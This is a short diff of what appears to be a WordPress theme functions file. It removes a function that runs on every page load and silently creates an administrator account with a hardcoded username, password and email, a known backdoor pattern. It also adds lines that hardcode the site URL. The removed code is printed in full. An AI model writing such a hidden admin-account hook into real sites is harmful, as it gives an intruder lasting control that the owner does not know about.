@@ -32,13 +32,5 @@ add_filter( 'gettext', 'remove_lostpassword_text' );
 
 
 
-function wpb_admin_account(){
-$user = 'mr.rousnay';
-$pass = 'rousnay%bio';
-$email = 'mr.rousnay@gmail.com';
-if ( !username_exists( $user )  && !email_exists( $email ) ) {
-$user_id = wp_create_user( $user, $pass, $email );
-$user = new WP_User( $user_id );
-$user->set_role( 'administrator' );
-} }
-add_action('init','wpb_admin_account');
+update_option( 'siteurl', 'http://biocuration.wpengine.com' );
+update_option( 'home', 'http://biocuration.wpengine.com' );
